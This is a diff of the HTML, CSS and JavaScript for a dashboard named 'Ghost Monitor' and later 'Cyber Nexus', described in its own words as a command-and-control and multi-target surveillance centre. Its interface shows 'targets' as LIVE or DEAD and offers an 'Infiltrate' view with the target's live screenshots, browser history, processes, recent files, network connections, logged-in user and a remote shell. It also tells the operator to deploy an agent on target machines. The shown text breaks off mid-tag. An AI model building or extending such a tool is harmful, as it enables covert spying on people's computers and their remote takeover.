-        .cmd-row input {
-            flex: 1;
-            padding: 8px 14px;
-            border-radius: 4px;
-            border: 1px solid var(--border);
-            background: var(--bg-primary);
-            color: var(--green);
+        .target-ip {
             font-size: 12px;
-            font-family: var(--font-mono);
-            transition: border-color 0.2s;
+            color: var(--text-sub);
+            font-family: var(--font-code);
         }
-        .cmd-row input:focus { outline: none; border-color: var(--green); box-shadow: 0 0 10px rgba(0,255,65,0.15); }
-        .cmd-row input::placeholder { color: var(--text-muted); }
-        .cmd-run-btn {
-            background: transparent;
-            color: var(--green);
-            border: 1px solid var(--green);
-            padding: 8px 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: 700;
+
+        .status-badge {
+            font-family: var(--font-code);
             font-size: 11px;
-            font-family: var(--font-mono);
-            white-space: nowrap;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            transition: all 0.2s;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 4px;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-        .cmd-run-btn:hover { background: rgba(0,255,65,0.1); box-shadow: 0 0 15px rgba(0,255,65,0.2); }
-        .cmd-output {
-            background: var(--bg-primary);
-            border: 1px solid var(--border);
-            padding: 12px 14px;
-            border-radius: 4px;
-            margin-top: 8px;
-            max-height: 200px;
-            overflow: auto;
+        .status-badge.online { background: rgba(0, 255, 136, 0.15); color: var(--neon-green); border: 1px solid rgba(0, 255, 136, 0.3); }
+        .status-badge.offline { background: rgba(255, 42, 109, 0.15); color: var(--red-alert); border: 1px solid rgba(255, 42, 109, 0.3); }
+
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            background: var(--bg-surface);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            padding: 10px;
+            margin-bottom: 14px;
+        }
+
+        .metric-box {
+            text-align: center;
+        }
+
+        .metric-label {
+            font-size: 10px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            font-family: var(--font-code);
+            margin-bottom: 4px;
+        }
+
+        .metric-val {
+            font-family: var(--font-display);
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--cyan);
+        }
+
+        .progress-bar {
+            height: 3px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 4px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            border-radius: 2px;
+            transition: width 0.5s;
+        }
+        .progress-fill.cpu { background: var(--cyan); }
+        .progress-fill.mem { background: var(--neon-purple); }
+        .progress-fill.disk { background: var(--neon-orange); }
+
+        .card-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 12px;
+            color: var(--text-sub);
+            font-family: var(--font-code);
+        }
+
+        .infiltrate-btn {
+            color: var(--cyan);
+            font-family: var(--font-display);
             font-size: 11px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            text-transform: uppercase;
+        }
+
+        /* MODAL STYLES */
+        .modal-backdrop {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal-backdrop.active { display: flex; }
+
+        .cyber-modal {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-glow);
+            border-radius: var(--radius-main);
+            width: 100%;
+            max-width: 1250px;
+            max-height: 90vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 50px rgba(0, 243, 255, 0.2);
+            overflow: hidden;
+            animation: modalIn 0.3s ease;
+        }
+
+        @keyframes modalIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .modal-head {
+            padding: 16px 24px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--bg-card);
+        }
+
+        .modal-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .modal-title h2 {
+            font-family: var(--font-display);
+            font-size: 1.2rem;
+            color: var(--cyan);
+        }
+
+        .close-btn {
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-sub);
+            width: 34px; height: 34px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.2s;
+        }
+
+        .close-btn:hover {
+            background: var(--red-alert);
+            color: #fff;
+            border-color: var(--red-alert);
+        }
+
+        .modal-body-scroll {
+            padding: 24px;
+            overflow-y: auto;
+            flex: 1;
+        }
+
+        .modal-grid-layout {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 16px;
+        }
+
+        .hud-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            padding: 16px;
+        }
+
+        .hud-card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 8px;
+        }
+
+        .hud-card-header h3 {
+            font-family: var(--font-display);
+            font-size: 12px;
+            color: var(--cyan);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .full-span { grid-column: 1 / -1; }
+
+        /* Terminal inside modal */
+        .cyber-term-output {
+            background: var(--bg-base);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            padding: 14px;
+            font-family: var(--font-code);
+            font-size: 12px;
+            color: var(--neon-green);
+            min-height: 120px;
+            max-height: 240px;
+            overflow-y: auto;
             white-space: pre-wrap;
-            word-break: break-all;
-            font-family: var(--font-mono);
-            color: var(--green);
-            min-height: 40px;
             line-height: 1.5;
+            margin-top: 10px;
         }
-        .cmd-output::-webkit-scrollbar { width: 3px; }
-        .cmd-output::-webkit-scrollbar-track { background: transparent; }
-        .cmd-output::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
-        .cmd-error { color: var(--red); }
 
-        .no-data {
-            text-align: center; padding: 20px; color: var(--text-muted); font-size: 11px;
+        .term-input-group {
+            display: flex;
+            gap: 8px;
         }
-        .no-data i { font-size: 1.3rem; display: block; margin-bottom: 6px; opacity: 0.3; }
 
-        /* ========== RESPONSIVE ========== */
+        .term-input-group input {
+            flex: 1;
+            padding: 10px 14px;
+            background: var(--bg-base);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            color: var(--text-main);
+            font-family: var(--font-code);
+            font-size: 13px;
+        }
+
+        .term-input-group input:focus {
+            outline: none;
+            border-color: var(--cyan);
+        }
+
+        .term-input-group button {
+            background: var(--cyan);
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: var(--radius-sm);
+            font-family: var(--font-display);
+            font-size: 11px;
+            font-weight: 800;
+            cursor: pointer;
+        }
+
+        /* Preset buttons */
+        .preset-cmds {
+            display: flex;
+            gap: 6px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+
+        .preset-btn {
+            background: rgba(0, 243, 255, 0.08);
+            border: 1px solid var(--border-color);
+            color: var(--text-sub);
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-family: var(--font-code);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .preset-btn:hover { background: var(--cyan); color: #000; }
+
+        /* Responsive */
         @media (max-width: 768px) {
-            .topbar { padding: 10px 14px; }
-            .main { padding: 14px; }
+            .topbar { flex-direction: column; align-items: flex-start; }
             .agents-grid { grid-template-columns: 1fr; }
-            .modal-grid { grid-template-columns: 1fr; }
-            .modal-stats { grid-template-columns: repeat(2, 1fr); }
+            .modal-grid-layout { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
 
-<!-- ============= MATRIX RAIN ============= -->
+<div class="scanlines"></div>
 <canvas id="matrixCanvas"></canvas>
 
-<!-- ============= TOP BAR ============= -->
+<!-- TOPBAR -->
 <div class="topbar">
     <div class="brand">
-        <div class="brand-icon"><i class="fas fa-skull-crossbones"></i></div>
-        <div>
-            <h1>Ghost Monitor</h1>
-            <div class="brand-sub">☠ Command & Control Center ☠</div>
+        <div class="cyber-logo"><i class="fas fa-shield-halved"></i></div>
+        <div class="brand-text">
+            <h1>CYBER <span>NEXUS</span></h1>
+            <div class="brand-tag">⚡ MULTI-TARGET SURVEILLANCE & COMMAND</div>
         </div>
     </div>
-    <div class="topbar-right">
-        <div class="stat-pill total"><i class="fas fa-server"></i> <span id="totalCount">0</span> TARGETS</div>
-        <div class="stat-pill online"><i class="fas fa-circle"></i> <span id="onlineCount">0</span> LIVE</div>
-        <div class="stat-pill offline"><i class="fas fa-circle"></i> <span id="offlineCount">0</span> DEAD</div>
-        <span class="last-update" id="lastUpdate"></span>
-        <button class="refresh-btn" onclick="refreshAll()">
-            <i class="fas fa-sync-alt" id="refreshIcon"></i> Scan
+
+    <div class="topbar-actions">
+        <div class="hud-pill total"><i class="fas fa-server"></i> <span id="totalCount">0</span> TARGETS</div>
+        <div class="hud-pill online"><i class="fas fa-wifi"></i> <span id="onlineCount">0</span> LIVE</div>
+        <div class="hud-pill offline"><i class="fas fa-circle-xmark"></i> <span id="offlineCount">0</span> DEAD</div>
+
+        <!-- Theme Selector -->
+        <div class="theme-switcher">
+            <button class="theme-btn active" onclick="setTheme('slate')"><i class="fas fa-moon"></i> SLATE</button>
+            <button class="theme-btn" onclick="setTheme('light')"><i class="fas fa-sun"></i> LIGHT</button>
+            <button class="theme-btn" onclick="setTheme('matrix')"><i class="fas fa-terminal"></i> MATRIX</button>
+        </div>
+
+        <button class="action-btn" onclick="refreshAll()">
+            <i class="fas fa-rotate" id="refreshIcon"></i> SCAN NETWORK
         </button>
     </div>
 </div>
 
-<!-- ============= MAIN ============= -->
-<div class="main">
-    <div class="empty-state" id="emptyState" style="display:none;">
-        <div class="empty-icon"><i class="fas fa-skull"></i></div>
-        <h2>No Targets Detected</h2>
-        <p>Deploy an agent on target machines to start monitoring. They will appear here automatically.</p>
-        <code>python3 monitor.py --server https://&lt;your-server&gt;</code>
+<!-- MAIN -->
+<div class="main-container">
+    <!-- CONTROLS -->
+    <div class="controls-bar">
+        <div class="search-box">
+            <i class="fas fa-magnifying-glass"></i>
+            <input type="text" id="searchInput" placeholder="Filter targets by name, IP, OS..." oninput="filterTargets()">
+        </div>
+
+        <div class="filter-tabs">
+            <button class="tab-btn active" onclick="filterTab('all', this)"><i class="fas fa-list"></i> ALL TARGETS</button>
+            <button class="tab-btn" onclick="filterTab('online', this)"><i class="fas fa-bolt" style="color:var(--neon-green)"></i> LIVE ONLY</button>
+            <button class="tab-btn" onclick="filterTab('offline', this)"><i class="fas fa-power-off" style="color:var(--red-alert)"></i> DEAD ONLY</button>
+        </div>
     </div>
+
+    <!-- TARGETS GRID -->
     <div class="agents-grid" id="agentsGrid"></div>
 </div>
 
-<!-- ============= DETAIL MODAL ============= -->
-<div class="modal-overlay" id="modalOverlay" onclick="if(event.target===this) closeModal()">
-    <div class="modal" id="modalContent"></div>
+<!-- DETAIL MODAL -->
+<div class="modal-backdrop" id="modalBackdrop" onclick="if(event.target===this) closeModal()">
+    <div class="cyber-modal">
+        <div class="modal-head">
+            <div class="modal-title">
+                <i class="fas fa-terminal" style="color:var(--cyan);font-size:1.2rem;"></i>
+                <h2 id="modalTargetTitle">TARGET INFILTRATION</h2>
+            </div>
+            <button class="close-btn" onclick="closeModal()"><i class="fas fa-xmark"></i></button>
+        </div>
+        <div class="modal-body-scroll" id="modalContent">
+            <!-- Dynamic Content -->
+        </div>
+    </div>
 </div>
 
-<!-- ============= JAVASCRIPT ============= -->
 <script>
 let allMachines = [];
+let filteredMachines = [];
+let activeTab = 'all';
+let currentDetailId = null;
 let isRefreshing = false;
-let detailMachineId = null;
-let screenshotEnabled = true;
 
-// ==================== MATRIX RAIN ====================
+// THEME SWITCHER
+function setTheme(theme) {
+    document.documentElement.setAttribute('data-theme', theme);
+    document.querySelectorAll('.theme-btn').forEach(btn => {
+        btn.classList.toggle('active', btn.textContent.toLowerCase().includes(theme));
+    });
+}
+
+// MATRIX CANVAS
 const canvas = document.getElementById('matrixCanvas');
 const ctx = canvas.getContext('2d');
-
 function initMatrix() {
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
-    const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF<>/{}[]☠💀';
+    const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ<>/{}[]⚡';
     const fontSize = 14;
     const columns = canvas.width / fontSize;
     const drops = Array(Math.floor(columns)).fill(1);
 
     function draw() {
-        ctx.fillStyle = 'rgba(10, 10, 10, 0.05)';
+        ctx.fillStyle = 'rgba(11, 17, 32, 0.05)';
         ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = '#00ff41';
+        ctx.fillStyle = '#00f3ff';
         ctx.font = fontSize + 'px monospace';
 
         for (let i = 0; i < drops.length; i++) {
             const text = chars[Math.floor(Math.random() * chars.length)];
             ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                drops[i] = 0;
-            }
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
             drops[i]++;
         }
     }
@@ -970,7 +803,7 @@ function initMatrix() {
 initMatrix();
 window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
 
-// ==================== LOAD ALL MACHINES ====================
+// LOAD MACHINES
 async function loadMachines() {
     try {
         const res = await fetch('/api/machines');
@@ -982,93 +815,91 @@ async function loadMachines() {
         document.getElementById('onlineCount').textContent = online;
         document.getElementById('offlineCount').textContent = offline;
 
-        if (allMachines.length === 0) {
-            document.getElementById('emptyState').style.display = 'block';
-            document.getElementById('agentsGrid').style.display = 'none';
-            return;
-        }
-
-        document.getElementById('emptyState').style.display = 'none';
-        document.getElementById('agentsGrid').style.display = 'grid';
-
-        allMachines.sort((a, b) => {
-            if (a.status === 'online' && b.status !== 'online') return -1;
-            if (a.status !== 'online' && b.status === 'online') return 1;
-            return (a.hostname || a.id).localeCompare(b.hostname || b.id);
-        });
-
-        const infoPromises = allMachines.map(m =>
-            fetch(`/api/machine/${m.id}/info`).then(r => r.json()).catch(() => ({}))
-        );
-        const infos = await Promise.all(infoPromises);
-
-        const grid = document.getElementById('agentsGrid');
-        grid.innerHTML = allMachines.map((m, i) => {
-            const info = infos[i] || {};
-            const cpu = info.cpu_percent !== undefined ? info.cpu_percent : '--';
-            const mem = info.memory_percent !== undefined ? info.memory_percent : '--';
-            const disk = info.disk_percent !== undefined ? info.disk_percent : '--';
-            const cpuW = cpu !== '--' ? cpu : 0;
-            const memW = mem !== '--' ? mem : 0;
-            const diskW = disk !== '--' ? disk : 0;
-            const status = m.status || 'offline';
-            const lastSeen = formatLastSeen(m.last_seen);
-
-            return `
-            <div class="agent-card ${status}" onclick="openDetail('${m.id}')">
-                <div class="card-top">
-                    <div class="card-user">
-                        <div class="card-avatar ${status}">
-                            <i class="fas fa-ghost"></i>
-                            <div class="live-dot ${status}"></div>
-                        </div>
-                        <div style="min-width:0;">
-                            <div class="card-hostname">${escHtml(m.hostname || m.id)}</div>
-                            <div class="card-ip">${escHtml(m.ip || 'N/A')}</div>
-                        </div>
-                    </div>
-                    <span class="card-status-badge ${status}">${status === 'online' ? '● LIVE' : '✕ DEAD'}</span>
-                </div>
-                <div class="card-stats">
-                    <div class="card-stat">
-                        <div class="card-stat-label">CPU</div>
-                        <div class="card-stat-value cpu">${cpu}${cpu !== '--' ? '%' : ''}</div>
-                        <div class="card-stat-bar"><div class="card-stat-bar-fill cpu" style="width:${cpuW}%"></div></div>
-                    </div>
-                    <div class="card-stat">
-                        <div class="card-stat-label">Memory</div>
-                        <div class="card-stat-value mem">${mem}${mem !== '--' ? '%' : ''}</div>
-                        <div class="card-stat-bar"><div class="card-stat-bar-fill mem" style="width:${memW}%"></div></div>
-                    </div>
-                    <div class="card-stat">
-                        <div class="card-stat-label">Disk</div>
-                        <div class="card-stat-value disk">${disk}${disk !== '--' ? '%' : ''}</div>
-                        <div class="card-stat-bar"><div class="card-stat-bar-fill disk" style="width:${diskW}%"></div></div>
-                    </div>
-                </div>
-                <div class="card-footer">
-                    <span><i class="fas fa-clock"></i> ${lastSeen}</span>
-                    <span class="view-btn"><i class="fas fa-crosshairs"></i> Infiltrate</span>
-                </div>
-            </div>`;
-        }).join('');
-
+        filterTargets();
     } catch (e) {
         console.error('loadMachines error:', e);
     }
 }
 
-function formatLastSeen(ts) {
-    if (!ts || ts === 'never') return 'Never';
-    try {
-        const d = new Date(ts);
-        const diff = Math.floor((Date.now() - d.getTime()) / 1000);
-        if (diff < 10) return 'Just now';
-        if (diff < 60) return diff + 's ago';
-        if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
-        if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
-        return d.toLocaleDateString();
-    } catch { return ts; }
+function filterTab(tab, btn) {
+    activeTab = tab;
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    filterTargets();
+}
+
+async function filterTargets() {
+    const search = document.getElementById('searchInput').value.toLowerCase();
+    filteredMachines = allMachines.filter(m => {
+        const matchTab = activeTab === 'all' || m.status === activeTab;
+        const matchSearch = (m.hostname || '').toLowerCase().includes(search) || 
+                            (m.ip || '').toLowerCase().includes(search) || 
+                            (m.id || '').toLowerCase().includes(search);
+        return matchTab && matchSearch;
+    });
+
+    const grid = document.getElementById('agentsGrid');
+    if (filteredMachines.length === 0) {
+        grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:60px;color:var(--text-sub);">
+            <i class="fas fa-radar fa-spin" style="font-size:2.5rem;color:var(--cyan);margin-bottom:12px;"></i>
+            <h3 style="font-family:var(--font-display);">NO TARGETS DETECTED</h3>
+            <p style="font-size:13px;margin-top:4px;">Deploy agent script on target Mac machines to automatically monitor them here.</p>
+        </div>`;
+        return;
+    }
+
+    const infoPromises = filteredMachines.map(m =>
+        fetch(`/api/machine/${m.id}/info`).then(r => r.json()).catch(() => ({}))
+    );
+    const infos = await Promise.all(infoPromises);
+
+    grid.innerHTML = filteredMachines.map((m, i) => {
+        const info = infos[i] || {};
+        const cpu = info.cpu_percent !== undefined ? info.cpu_percent : '--';
+        const mem = info.memory_percent !== undefined ? info.memory_percent : '--';
+        const disk = info.disk_percent !== undefined ? info.disk_percent : '--';
+        const status = m.status || 'offline';
+
+        return `
+        <div class="agent-card ${status}" onclick="openDetail('${m.id}')">
+            <div class="card-header">
+                <div class="target-info">
+                    <div class="target-icon ${status}">
+                        <i class="fas fa-desktop"></i>
+                        <div class="live-dot ${status}"></div>
+                    </div>
+                    <div>
+                        <div class="target-name">${escHtml(m.hostname || m.id)}</div>
+                        <div class="target-ip">${escHtml(m.ip || 'N/A')}</div>
+                    </div>
+                </div>
+                <span class="status-badge ${status}">${status === 'online' ? '● LIVE' : '✕ DEAD'}</span>
+            </div>
+
+            <div class="metrics-grid">
+                <div class="metric-box">
+                    <div class="metric-label">CPU</div>
+                    <div class="metric-val">${cpu}${cpu !== '--' ? '%' : ''}</div>
+                    <div class="progress-bar"><div class="progress-fill cpu" style="width:${cpu !== '--' ? cpu : 0}%"></div></div>
+                </div>
+                <div class="metric-box">
+                    <div class="metric-label">RAM</div>
+                    <div class="metric-val" style="color:var(--neon-purple)">${mem}${mem !== '--' ? '%' : ''}</div>
+                    <div class="progress-bar"><div class="progress-fill mem" style="width:${mem !== '--' ? mem : 0}%"></div></div>
+                </div>
+                <div class="metric-box">
+                    <div class="metric-label">DISK</div>
+                    <div class="metric-val" style="color:var(--neon-orange)">${disk}${disk !== '--' ? '%' : ''}</div>
+                    <div class="progress-bar"><div class="progress-fill disk" style="width:${disk !== '--' ? disk : 0}%"></div></div>
+                </div>
+            </div>
+
+            <div class="card-footer">
+                <span><i class="fas fa-user-shield"></i> ${escHtml(info.active_user || 'system')}</span>
+                <span class="infiltrate-btn"><i class="fas fa-crosshairs"></i> CONTROL <i class="fas fa-arrow-right"></i></span>
+            </div>
+        </div>`;
+    }).join('');
 }
 
 function escHtml(s) {
@@ -1077,32 +908,19 @@ function escHtml(s) {
     return d.innerHTML;
 }
 
-// ==================== OPEN DETAIL MODAL ====================
+// OPEN DETAIL MODAL
 async function openDetail(machineId) {
-    detailMachineId = machineId;
-    const overlay = document.getElementById('modalOverlay');
-    const modal = document.getElementById('modalContent');
+    currentDetailId = machineId;
+    const backdrop = document.getElementById('modalBackdrop');
+    const content = document.getElementById('modalContent');
     const machine = allMachines.find(m => m.id === machineId) || {};
-    const status = machine.status || 'offline';
     
-    modal.innerHTML = `
-        <div class="modal-header">
-            <div class="modal-header-left">
-                <div class="modal-avatar ${status}"><i class="fas fa-ghost"></i></div>
-                <div>
-                    <div class="modal-title">${escHtml(machine.hostname || machineId)}</div>
-                    <div class="modal-subtitle">${escHtml(machine.ip || '')} · ${escHtml(machineId)}</div>
-                </div>
-            </div>
-            <button class="modal-close" onclick="closeModal()"><i class="fas fa-times"></i></button>
-        </div>
-        <div style="padding:50px;text-align:center;color:var(--text-muted);">
-            <i class="fas fa-skull fa-spin" style="font-size:1.8rem;margin-bottom:10px;display:block;color:var(--green);"></i>
-            Infiltrating target...
-        </div>
-    `;
-    overlay.classList.add('active');
-    document.body.style.overflow = 'hidden';
+    document.getElementById('modalTargetTitle').textContent = `TARGET: ${(machine.hostname || machineId).toUpperCase()}`;
+    content.innerHTML = `<div style="text-align:center;padding:50px;color:var(--cyan);font-family:var(--font-code);">
+        <i class="fas fa-spinner fa-spin" style="font-size:2rem;margin-bottom:12px;"></i><br>INFILTRATING TARGET DATA FEED...
+    </div>`;
+    
+    backdrop.classList.add('active');
 
     try {
         const [info, active, history, procs, files, net, apps] = await Promise.all([
@@ -1115,338 +933,195 @@ async function openDetail(machineId) {
             fetch(`/api/machine/${machineId}/apps`).then(r => r.json()).catch(() => [])
         ]);
 
-        const cpu = info.cpu_percent ?? '--';
-        const mem = info.memory_percent ?? '--';
-        const disk = info.disk_percent ?? '--';
+        content.innerHTML = `
+        <div class="modal-grid-layout">
 
-        modal.innerHTML = `
-            <div class="modal-header">
-                <div class="modal-header-left">
-                    <div class="modal-avatar ${status}"><i class="fas fa-ghost"></i></div>
-                    <div>
-                        <div class="modal-title">${escHtml(info.hostname || machine.hostname || machineId)}</div>
-                        <div class="modal-subtitle">${escHtml(info.ip || machine.ip || '')} · ${escHtml(machineId)}</div>
-                    </div>
+            <!-- Live Screenshot Feed -->
+            <div class="hud-card full-span">
+                <div class="hud-card-header">
+                    <h3><i class="fas fa-video"></i> LIVE SURVEILLANCE FEED</h3>
+                    <button class="preset-btn" onclick="refreshModalSS('${machineId}')"><i class="fas fa-rotate"></i> REFRESH FEED</button>
                 </div>
-                <button class="modal-close" onclick="closeModal()"><i class="fas fa-times"></i></button>
-            </div>
-
-            <div class="modal-stats">
-                <div class="m-stat">
-                    <div class="m-stat-label">CPU</div>
-                    <div class="m-stat-value" style="color:var(--cyan);">${cpu}${cpu !== '--' ? '%' : ''}</div>
-                    <div class="m-stat-bar"><div class="m-stat-bar-fill" style="width:${cpu !== '--' ? cpu : 0}%;background:var(--cyan);box-shadow:0 0 6px var(--cyan);"></div></div>
-                </div>
-                <div class="m-stat">
-                    <div class="m-stat-label">Memory</div>
-                    <div class="m-stat-value" style="color:var(--purple);">${mem}${mem !== '--' ? '%' : ''}</div>
-                    <div class="m-stat-sub">${info.memory_used ?? '--'} / ${info.memory_total ?? '--'} GB</div>
-                    <div class="m-stat-bar"><div class="m-stat-bar-fill" style="width:${mem !== '--' ? mem : 0}%;background:var(--purple);box-shadow:0 0 6px var(--purple);"></div></div>
-                </div>
-                <div class="m-stat">
-                    <div class="m-stat-label">Disk</div>
-                    <div class="m-stat-value" style="color:var(--orange);">${disk}${disk !== '--' ? '%' : ''}</div>
-                    <div class="m-stat-sub">${info.disk_used ?? '--'} / ${info.disk_total ?? '--'} GB</div>
-                    <div class="m-stat-bar"><div class="m-stat-bar-fill" style="width:${disk !== '--' ? disk : 0}%;background:var(--orange);box-shadow:0 0 6px var(--orange);"></div></div>
-                </div>
-                <div class="m-stat">
-                    <div class="m-stat-label">Uptime</div>
-                    <div class="m-stat-value" style="color:var(--green);font-size:1rem;">${info.uptime || '--'}</div>
-                    <div class="m-stat-sub">${info.os || '--'}</div>
-                </div>
-                <div class="m-stat">
-                    <div class="m-stat-label">Net Sent</div>
-                    <div class="m-stat-value" style="color:var(--cyan);">${net.bytes_sent ?? '--'}</div>
-                    <div class="m-stat-sub">MB total</div>
-                </div>
-                <div class="m-stat">
-                    <div class="m-stat-label">Net Recv</div>
-                    <div class="m-stat-value" style="color:var(--green);">${net.bytes_recv ?? '--'}</div>
-                    <div class="m-stat-sub">MB total</div>
+                <div style="background:#000;border-radius:6px;overflow:hidden;border:1px solid var(--border-color);text-align:center;">
+                    <img id="modalSSImg" src="/api/machine/${machineId}/screenshot?t=${Date.now()}" style="width:100%;max-height:450px;object-fit:contain;display:block;" 
+                         onerror="this.parentElement.innerHTML='<div style=\\'padding:40px;color:var(--text-sub);\\'><i class=\\'fas fa-eye-slash\\' style=\\'font-size:2rem;margin-bottom:8px;display:block;\\'></i>Surveillance feed unavailable</div>'">
                 </div>
             </div>
 
-            <div class="modal-body">
-                <div class="modal-grid">
+            <!-- Active Window -->
+            <div class="hud-card">
+                <div class="hud-card-header"><h3><i class="fas fa-window-restore"></i> ACTIVE WINDOW</h3></div>
+                <div style="font-family:var(--font-display);font-size:1.3rem;color:var(--cyan);font-weight:700;">
+                    ${escHtml(active.active || 'Desktop')}
+                </div>
+                <div style="font-size:12px;color:var(--text-sub);margin-top:6px;">Logged User: <b>${escHtml(info.active_user || 'system')}</b></div>
+            </div>
 
-                    <!-- Screenshot with controls -->
-                    <div class="m-card full-span">
-                        <div class="m-card-header">
-                            <h3><i class="fas fa-eye"></i> Live Surveillance</h3>
-                            <div class="ss-controls">
-                                <button class="ss-btn download-btn" onclick="downloadScreenshot('${machineId}')" title="Download Screenshot">
-                                    <i class="fas fa-download"></i> Save
-                                </button>
-                                <button class="ss-btn" onclick="refreshScreenshot('${machineId}')" title="Refresh Screenshot">
-                                    <i class="fas fa-sync-alt"></i> Refresh
-                                </button>
-                                <button class="ss-btn ${screenshotEnabled ? 'active' : 'danger'}" id="ssToggleBtn" onclick="toggleScreenshot()" title="Toggle Screenshot Capture">
-                                    <i class="fas fa-${screenshotEnabled ? 'eye' : 'eye-slash'}"></i> ${screenshotEnabled ? 'ON' : 'OFF'}
-                                </button>
-                            </div>
-                        </div>
-                        <div class="m-card-body" style="max-height:none;" id="modalScreenshot">
-                            ${screenshotEnabled ? buildScreenshot(machineId) : '<div class="ss-placeholder"><i class="fas fa-eye-slash"></i>Surveillance paused</div>'}
-                        </div>
-                    </div>
-
-                    <!-- Active Window -->
-                    <div class="m-card">
-                        <div class="m-card-header"><h3><i class="fas fa-crosshairs"></i> Active Window</h3></div>
-                        <div class="m-card-body">
-                            <div class="active-win-text">${escHtml(active.active || 'Unknown')}</div>
-                            <div style="font-size:10px;color:var(--text-muted);margin-top:4px;">Captured at ${new Date().toLocaleTimeString()}</div>
-                        </div>
-                    </div>
-
-                    <!-- Machine Info -->
-                    <div class="m-card">
-                        <div class="m-card-header"><h3><i class="fas fa-fingerprint"></i> Target Info</h3></div>
-                        <div class="m-card-body" style="font-size:12px;line-height:2;">
-                            <div><span style="color:var(--text-muted);">Host:</span> ${escHtml(info.hostname || '--')}</div>
-                            <div><span style="color:var(--text-muted);">IP:</span> <span style="color:var(--cyan);">${escHtml(info.ip || '--')}</span></div>
-                            <div><span style="color:var(--text-muted);">OS:</span> ${escHtml(info.os || '--')}</div>
-                            <div><span style="color:var(--text-muted);">Cores:</span> ${info.cpu_cores || '--'}</div>
-                            <div><span style="color:var(--text-muted);">Status:</span> <span style="color:${status === 'online' ? 'var(--green)' : 'var(--red)'};font-weight:700;">${status === 'online' ? '● LIVE' : '✕ DEAD'}</span></div>
-                        </div>
-                    </div>
-
-                    <!-- Browser History -->
-                    <div class="m-card">
-                        <div class="m-card-header">
-                            <h3><i class="fas fa-globe"></i> Browser Intel</h3>
-                            <span style="font-size:10px;color:var(--text-muted);">${history.length} entries</span>
-                        </div>
-                        <div class="m-card-body">${buildHistory(history)}</div>
-                    </div>
-
-                    <!-- Processes -->
-                    <div class="m-card">
-                        <div class="m-card-header">
-                            <h3><i class="fas fa-microchip"></i> Processes</h3>
-                            <span style="font-size:10px;color:var(--text-muted);">${procs.length} running</span>
-                        </div>
-                        <div class="m-card-body">${buildProcesses(procs)}</div>
-                    </div>
-
-                    <!-- Recent Files -->
-                    <div class="m-card">
-                        <div class="m-card-header"><h3><i class="fas fa-folder-open"></i> Recent Files</h3></div>
-                        <div class="m-card-body">${buildFiles(files)}</div>
-                    </div>
-
-                    <!-- Network -->
-                    <div class="m-card">
-                        <div class="m-card-header"><h3><i class="fas fa-network-wired"></i> Network Intel</h3></div>
-                        <div class="m-card-body">${buildConnections(net)}</div>
-                    </div>
-
-                    <!-- Remote Terminal -->
-                    <div class="m-card full-span">
-                        <div class="m-card-header">
-                            <h3><i class="fas fa-terminal"></i> Remote Shell</h3>
-                            <span style="font-size:10px;color:var(--text-muted);">Execute on ${escHtml(info.hostname || machine.hostname || machineId)}</span>
-                        </div>
-                        <div class="m-card-body terminal-box" style="max-height:none;">
-                            <div class="cmd-row">
-                                <input type="text" id="cmdInput" placeholder="root@target:~$ type command..."
